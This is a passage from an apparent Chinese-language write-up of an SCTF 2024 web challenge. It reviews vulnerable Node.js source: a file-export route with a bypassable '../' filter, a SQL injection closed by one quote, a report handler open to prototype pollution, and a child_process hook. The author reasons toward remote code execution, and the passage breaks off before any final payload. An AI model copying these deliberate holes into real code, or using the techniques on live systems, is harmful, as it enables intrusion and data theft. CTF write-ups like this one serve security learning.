    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'This Website Only Open for admin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Error decrypting password!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/ExP0rtApi'</span><span class="token punctuation">,</span> verifyAdmin<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> rootpath <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>v<span class="token punctuation">;</span>
  <span class="token keyword">var</span> file <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>f<span class="token punctuation">;</span>

  file <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  rootpath <span class="token operator">=</span> rootpath<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.\/</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>rootpath <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>file <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'try to find parameters HaHa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      rootpath <span class="token operator">=</span> <span class="token string">"static"</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> rootpath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> fileData</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error reading file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error reading file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    zlib<span class="token punctuation">.</span><span class="token function">gzip</span><span class="token punctuation">(</span>fileData<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> compressedData</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error compressing file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error compressing file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">const</span> base64Data <span class="token operator">=</span> compressedData<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>base64Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> verifyAdmin <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">"/static/report_noway_dirsearch.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> verifyAdmin <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>user<span class="token punctuation">,</span> date<span class="token punctuation">,</span> reportmessage<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">[</span>date<span class="token punctuation">]</span> <span class="token operator">=</span> reportmessage
  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('Report Success');window.location.href='/report'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/countreport'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> user <span class="token keyword">in</span> Reportcache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    count <span class="token operator">+=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//查看当前运行用户</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/VanZY_s_T3st"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> command <span class="token operator">=</span> <span class="token string">'whoami'</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> cmd <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span>command <span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  cmd<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server running on http://localhost:3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>package.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.20.3"</span><span class="token punctuation">,</span>
    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.6"</span><span class="token punctuation">,</span>
    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>
    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.21.0"</span><span class="token punctuation">,</span>
    <span class="token property">"jsonwebtoken"</span><span class="token operator">:</span> <span class="token string">"^9.0.2"</span><span class="token punctuation">,</span>
    <span class="token property">"mysql"</span><span class="token operator">:</span> <span class="token string">"^2.18.1"</span><span class="token punctuation">,</span>
    <span class="token property">"node-rsa"</span><span class="token operator">:</span> <span class="token string">"^1.1.1"</span><span class="token punctuation">,</span>
    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>
    <span class="token property">"require-in-the-middle"</span><span class="token operator">:</span> <span class="token string">"^7.4.0"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先尝试读flag</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930132909583.png" alt="image-20240930132909583"></p>
<p>解压得到<code>No Rce?I can&#39;t Give You Flag Bro</code>，:(</p>
<p>那还是要rce，审个代码先</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">select (select password from user where username = 'admin') = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>passwd<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这是我们刚才sql注入的点，一个<code>&#39;</code>闭合就行了</p>
<p>注意到开头</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> handle <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>引入了但是完全没用到，读取这个文件报了个错，猜测是个文件夹，尝试读handle&#x2F;index.js</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930141519835.png" alt="image-20240930141519835"></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> ritm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'require-in-the-middle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> patchChildProcess <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">new</span> <span class="token class-name">ritm<span class="token punctuation">.</span>Hook</span><span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">'child_process'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token string">'child_process'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token function">patchChildProcess</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读 handle&#x2F;child_process.js</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">patchChildProcess</span><span class="token punctuation">(</span><span class="token parameter">cp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    cp<span class="token punctuation">.</span>execFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>execFile<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cp<span class="token punctuation">.</span>fork <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>fork<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cp<span class="token punctuation">.</span>spawn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>spawn<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cp<span class="token punctuation">.</span>execFileSync <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>execFileSync<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cp<span class="token punctuation">.</span>execSync <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>execSync<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    cp<span class="token punctuation">.</span>spawnSync <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>cp<span class="token punctuation">.</span>spawnSync<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">apply</span><span class="token operator">:</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> cp<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">patchOptions</span><span class="token punctuation">(</span><span class="token parameter">hasArgs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> thisArg<span class="token punctuation">,</span> args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> pos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">===</span> args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">prototypelessSpawnOpts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>hasArgs <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                pos<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">prototypelessSpawnOpts</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">prototypelessSpawnOpts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> args<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                args<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">prototypelessSpawnOpts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">return</span> <span class="token function">target</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">prototypelessSpawnOpts</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> prototypelessObj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    prototypelessObj<span class="token punctuation">.</span>env <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prototypelessObj<span class="token punctuation">.</span>env <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> prototypelessObj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> patchChildProcess<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看不懂，总之是child_process的hook，作用是防options参数的原型链污染</p>
<p>观察一下这里</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> verifyAdmin <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>user<span class="token punctuation">,</span> date<span class="token punctuation">,</span> reportmessage<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">[</span>date<span class="token punctuation">]</span> <span class="token operator">=</span> reportmessage
  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('Report Success');window.location.href='/report'&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

